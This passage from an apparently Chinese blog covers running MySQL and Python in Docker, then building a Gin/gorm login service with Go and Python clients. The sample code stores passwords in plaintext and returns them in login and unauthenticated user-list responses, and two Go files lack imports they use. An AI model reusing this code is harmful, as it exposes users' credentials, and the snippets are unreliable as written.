<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -p 7777:3306 --name mysqltest --restart=always -v ~/mysql/conf:/etc/mysql/conf.d -v ~/mysql/data:/var/lib/mysql -v ~/mysql/logs:/logs -e MYSQL_ROOT_PASSWORD=root1234567 -d mysql:5.7</span><br><span class="line"></span><br><span class="line"># -p 7777:3306 ：容器内部端口3306映射到端口3306，既是稍后我们连接mysql用7777</span><br><span class="line"># --name ：运行的容器名称,每次为mysqltest</span><br><span class="line"># --restart always：开机启动</span><br><span class="line"># -v：如 ~/mysql/conf 对应容器的目录文件/etc/mysql/conf.d</span><br><span class="line"># -e MYSQL_ROOT_PASSWORD=root1234567：设置root的密码root1234567</span><br><span class="line"># -d 后台运行</span><br><span class="line"># mysql:5.7：既是运行这个镜像mysql:5.7</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>说明，还可以指定如下参数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--privileged=true：提升容器内权限</span><br><span class="line"> -e MYSQL_USER=”marvin”：添加用户marvin</span><br><span class="line"> -e MYSQL_PASSWORD=”pwd123”：设置marvin的密码伟pwd123</span><br><span class="line">--character-set-server=utf8：设置字符集为utf8</span><br><span class="line">--collation-server=utf8_general_ci：设置字符比较规则为utf8_general_ci</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：如果运行时添加了marvin用户，用root登录后执行用户授权<code>ALTER USER &#39;marvin&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;password123&#39;;</code>，才能用远程客户端访问数据库。</p>
</blockquote>
<ul>
<li>使用客户端（<code>HeidiSQL</code>）连接，用户名为<code>root</code>，密码为<code>root1234567</code></li>
</ul>
<p><img src="/aposts/7ae40889/image-20220318145451272.png" alt="image-20220318145451272"></p>
<ul>
<li>连接成功后，创建数据库和表</li>
</ul>
<p><img src="/aposts/7ae40889/image-20220318151159402.png" alt="image-20220318151159402"></p>
<ul>
<li>在服务器也可采用如下命令进入容器内部</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> docker exec -it mysqltest mysql -uroot -proot1234567</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> mysql&gt; select * from demo.student;</span><br><span class="line">+----+------+------+---------+</span><br><span class="line">| id | name | sex  | address |</span><br><span class="line">+----+------+------+---------+</span><br><span class="line">|  1 | ??   | ?    | 22333   |</span><br><span class="line">+----+------+------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="python实践"><a href="#python实践" class="headerlink" title="python实践"></a>python实践</h2><ul>
<li>搜索python镜像：<code>docker search python3</code></li>
</ul>
<p><img src="/aposts/7ae40889/image-20220318160151482.png" alt="image-20220318160151482"></p>
<ul>
<li>拉取python3.7的镜像</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull rackspacedot/python37 </span><br></pre></td></tr></table></figure>

<ul>
<li>拉取成功后可以看到镜像</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker images</span><br><span class="line">REPOSITORY              TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">rackspacedot/python37   latest    4513b6d75e1c   3 weeks ago    1.03GB</span><br><span class="line">mysql                   5.7       c20987f18b13   2 months ago   448MB</span><br><span class="line">hello-world             latest    feb5d9fea6a5   5 months ago   13.3kB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>创建自己的脚本目录。自己的应用或文件一定要放在宿主机上，使用-v 选项将宿主机的某个目录映射到容器的某个目录下，不然容器删除时，自己的应用及文件有可能会丢失。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /usr/local/python_proj</span><br></pre></td></tr></table></figure>

<ul>
<li>启动容器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -v /usr/local/python_proj:/usr/src/myapp -w /usr/src/myapp --name mypython-37 rackspacedot/python37</span><br><span class="line"># -itd 开启交互模式，为容器分配伪终端，在后台执行</span><br><span class="line"># -w  选项 为-w, --workdir=&quot;&quot;， 指定容器的工作目录为/usr/src/myapp</span><br><span class="line"># -v  选项将宿主机的/usr/local/python_pro录映射到容器的/usr/src/myapp目录</span><br><span class="line"># --name 容器名词</span><br><span class="line"># rackspacedot/python37 镜像名词</span><br></pre></td></tr></table></figure>

<ul>
<li>查看到已经启动成功：<code>docker ps</code></li>
</ul>
<p><img src="/aposts/7ae40889/image-20220318163618143.png" alt="image-20220318163618143"></p>
<ul>
<li>进入到容器查看python版本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker exec -it mypython-37 python3 --version</span><br><span class="line">Python 3.7.11</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>在本机（宿主）脚本目录准备测试脚本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/python_proj</span><br><span class="line">vi hello.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/python</span><br><span class="line">print(&quot;hello world!&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>运行结果</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos python_proj]#  docker exec -it mypython-37 python3 hello.py</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>

<ul>
<li><code>pip</code> 安装模块，可以进入到容器中，然后直接安装模块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入到容器中</span><br><span class="line">[root@VM-24-13-centos python_proj]# docker exec -it mypython-37 /bin/bash</span><br><span class="line">root@f471a7e4b8c8:/usr/src/myapp#  pip install requests</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以不进容器，直接在宿主机上安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos python_proj]#  docker exec -it mypython-37 pip install requests</span><br><span class="line">Requirement already satisfied: requests in /usr/local/lib/python3.7/site-packages (2.27.1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>gin实践指南</title>
    <url>/aposts/953abffc/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本次搭建环境为：<code>win10, go 1.20.4</code></li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li>新建并初始化项目</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd E:\proj\gowork</span><br><span class="line">mkdir studyGin</span><br><span class="line">cd studyGin</span><br><span class="line">go mod init example.com/myGin</span><br></pre></td></tr></table></figure>

<ul>
<li>下载并安装 gin</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\studyGin&gt; <span class="keyword">go</span> get -u github.com/gin-gonic/gin</span><br></pre></td></tr></table></figure>

<ul>
<li>在vscode中编写测试代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 1.创建路由</span></span><br><span class="line">	r := gin.Default()</span><br><span class="line">	<span class="comment">// 2.绑定路由规则，执行的函数</span></span><br><span class="line">	<span class="comment">// gin.Context，封装了request和response</span></span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.String(http.StatusOK, <span class="string">&quot;hello World!&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">// 3.监听端口，默认在8080</span></span><br><span class="line">	<span class="comment">// Run(&quot;里面不指定端口号默认为8080&quot;)</span></span><br><span class="line">	r.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGin&gt; go run .\main.go</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/953abffc/image-20230621153207713.png" alt="image-20230621153207713"></p>
<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><ul>
<li>分别新建文件夹，查看到<code>E:\proj\gowork\studyGin&gt;tree /F</code>文件结构如下：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">│  <span class="keyword">go</span>.mod</span><br><span class="line">│  <span class="keyword">go</span>.sum</span><br><span class="line">│  main.<span class="keyword">go</span></span><br><span class="line">│</span><br><span class="line">├─apis # 存放具体的业务逻辑，比如users.<span class="keyword">go</span>中放的增删改查的逻辑</span><br><span class="line">├─database # 存放数据库的相关配置</span><br><span class="line">├─middleware # 存放中间件的内容</span><br><span class="line">│  ├─jwt</span><br><span class="line">│  └─middleware</span><br><span class="line">├─models # 存放结构体的文件</span><br><span class="line">└─routers # 存放路由，比如get,post等对应关系</span><br></pre></td></tr></table></figure>

<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><ul>
<li><code>database/mysql.go</code>数据库连接</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> database</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装gorm</span></span><br><span class="line"><span class="comment">//go get gorm.io/gorm</span></span><br><span class="line"><span class="comment">// 安装mysql驱动</span></span><br><span class="line"><span class="comment">//go get gorm.io/driver/mysql</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDb</span><span class="params">()</span></span> &#123;</span><br><span class="line">	dsn := <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/test?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">	database, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open mysql error:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	Db = database</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Close</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sqlDB, _ := Db.DB()</span><br><span class="line">	sqlDB.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>models\users.go</code> 存放的表结构，实现登录功能（对user实体类的逻辑处理）</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/myGin/database&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name     <span class="type">string</span> <span class="string">`form:&quot;name&quot;,json:&quot;name&quot;,bingding:&quot;required&quot;,gorm:&quot;unique;not null&quot;`</span></span><br><span class="line">	Password <span class="type">string</span> <span class="string">`form:&quot;password&quot;,json:&quot;password&quot;,bingding:&quot;required&quot;gorm:&quot;NOT NULL&quot;`</span></span><br><span class="line">	Id       <span class="type">int</span>    <span class="string">`form:&quot;id&quot;,gorm:&quot;PRIMARY_KEY&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登录</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> Login() (user1 User, err <span class="type">error</span>) &#123;</span><br><span class="line">	obj := database.Db.Where(<span class="string">&quot;name=? and password=?&quot;</span>, u.Name, u.Password).First(&amp;user1)</span><br><span class="line">	<span class="keyword">if</span> err = obj.Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;这是登陆错误  %v 和 %T&quot;</span>, err, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(user1)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取用户列表</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> UserList() (users []User, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> err = database.Db.Find(&amp;users).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意func (u *User)  UserList这里的用法，外面的函数要调用时，必须用User.UserList的方式进行调用</p>
</blockquote>
<ul>
<li><code>api/users.go</code> 主要对<code>models\users.go</code> 代码进行调用，并把json数据返回给前端</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> apis</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/myGin/models&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserLogin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="comment">// c.ShouldBindJSON</span></span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123; <span class="comment">//把客户端格式传过来的数据绑定到结构体user中去</span></span><br><span class="line">		msg, err := user.Login() <span class="comment">// 调用model层的对应方法</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err.Error() == <span class="string">&quot;record not found&quot;</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;用户不存在&quot;</span>,</span><br><span class="line">					<span class="string">&quot;user&quot;</span>: <span class="literal">nil</span>,</span><br><span class="line">				&#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;登陆错误&quot;</span>,</span><br><span class="line">					<span class="string">&quot;user&quot;</span>: <span class="literal">nil</span>,</span><br><span class="line">				&#125;)</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;登陆成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;user&quot;</span>: msg,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取用户列表</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetUserList</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	users, err := user.UserList()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;get user list error:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>: users,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>routers/router.go</code> 对外的路由处理，比如<code>http,get</code>方法的处理</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/myGin/apis&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">()</span></span> *gin.Engine &#123;</span><br><span class="line"></span><br><span class="line">	router := gin.Default()</span><br><span class="line">	router.POST(<span class="string">&quot;/login&quot;</span>, apis.UserLogin)</span><br><span class="line">	router.GET(<span class="string">&quot;/GetUserList&quot;</span>, apis.GetUserList)</span><br><span class="line">	<span class="keyword">return</span> router</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>main.go</code> 代码入口</strong></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/myGin/database&quot;</span></span><br><span class="line">	<span class="string">&quot;example.com/myGin/routers&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	database.InitDb() <span class="comment">// 初始化数据库</span></span><br><span class="line">	<span class="keyword">defer</span> database.Close() </span><br><span class="line">	router := routers.InitRouter() <span class="comment">//指定路由</span></span><br><span class="line">	router.Run(<span class="string">&quot;:8000&quot;</span>)            <span class="comment">//在8000端口上运行</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行main.go，启动服务器</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGin&gt; <span class="keyword">go</span> run .\main.<span class="keyword">go</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">GIN-debug] POST   /login                    --&gt; example.com/myGin/apis.UserLogin (<span class="number">3</span> handlers)      </span><br><span class="line">[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.   </span><br><span class="line">Please check https:<span class="comment">//pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.</span></span><br><span class="line">[GIN-debug] Listening and serving HTTP on :<span class="number">8000</span></span><br></pre></td></tr></table></figure>

<h3 id="go编写客户端"><a href="#go编写客户端" class="headerlink" title="go编写客户端"></a>go编写客户端</h3><ul>
<li><code>client\client.go</code>用go编写客户端代码，包名为main，传递参数为json</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、测试post请求的结构体</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestPostLogin</span><span class="params">()</span></span> &#123;</span><br><span class="line">	reqMap := <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">		<span class="string">&quot;name&quot;</span>:     <span class="string">&quot;test1&quot;</span>,</span><br><span class="line">		<span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	body, err := json.Marshal(reqMap)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;TestPostReq json.Marshal err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	url := <span class="string">&quot;http://127.0.0.1:8000/login&quot;</span></span><br><span class="line"></span><br><span class="line">	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;TestPostReq http.NewRequest err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	req.Header.Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line"></span><br><span class="line">	client := &amp;http.Client&#123;Timeout: <span class="number">5</span> * time.Second&#125; <span class="comment">// 设置请求超时时长5s</span></span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;TestPostReq http.DefaultClient.Do() err: &quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	respBody, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;TestPostReq ioutil.ReadAll() err: &quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;respBody: &quot;</span>, <span class="type">string</span>(respBody))</span><br><span class="line"></span><br><span class="line">	rsp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">	err = json.Unmarshal(respBody, &amp;rsp)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;TestPostReq json.Unmarshal() err: &quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;rsp: %+v&quot;</span>, rsp)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 最后经过字段筛选后，再序列化成json格式即可</span></span><br><span class="line">	<span class="comment">// result, err := json.Marshal(rsp)</span></span><br><span class="line">	<span class="comment">// if err != nil &#123;</span></span><br><span class="line">	<span class="comment">// 	fmt.Println(&quot;TestPostReq json.Marrshal() err2: &quot;, err)</span></span><br><span class="line">	<span class="comment">// 	return</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line">	<span class="comment">// fmt.Println(string(result))</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestGetUserList</span><span class="params">()</span></span> &#123;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:8000/GetUserList&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;http get error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>) <span class="comment">// 创建一个切片，用例接受服务器返回的数据</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		m, err := resp.Body.Read(buf)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != io.EOF &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;resp.Body.Read error:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		res := <span class="type">string</span>(buf[:m])</span><br><span class="line">		fmt.Println(<span class="string">&quot;get server content,&quot;</span>, res)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	TestPostLogin()</span><br><span class="line">	TestGetUserList()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行<code>client.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGin&gt; <span class="keyword">go</span> run .\client\client.<span class="keyword">go</span></span><br><span class="line">respBody:  &#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;登陆成功&quot;</span>,<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;Name&quot;</span>:<span class="string">&quot;test1&quot;</span>,<span class="string">&quot;Password&quot;</span>:<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;Id&quot;</span>:<span class="number">3</span>&#125;&#125;</span><br><span class="line">rsp: <span class="keyword">map</span>[msg:登陆成功 user:<span class="keyword">map</span>[Id:<span class="number">3</span> Name:test1 Password:<span class="number">123456</span>]]</span><br><span class="line"></span><br><span class="line">get server content, &#123;<span class="string">&quot;msg&quot;</span>:[&#123;<span class="string">&quot;Name&quot;</span>:<span class="string">&quot;test1&quot;</span>,<span class="string">&quot;Password&quot;</span>:<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;Id&quot;</span>:<span class="number">3</span>&#125;,&#123;<span class="string">&quot;Name&quot;</span>:<span class="string">&quot;test2&quot;</span>,<span class="string">&quot;Password&quot;</span>:<span class="string">&quot;1234567&quot;</span>,<span class="string">&quot;Id&quot;</span>:<span class="number">4</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h3 id="python-发起请求"><a href="#python-发起请求" class="headerlink" title="python 发起请求"></a>python 发起请求</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data =&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;test1&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8000/login&quot;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp2 = requests.get(<span class="string">&quot;http://127.0.0.1:8000/GetUserList&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp2.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>得到结果如下</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;登陆成功&quot;</span><span class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span><span class="string">&quot;test1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span><span class="string">&quot;test1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span><span class="string">&quot;test2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Password&quot;</span><span 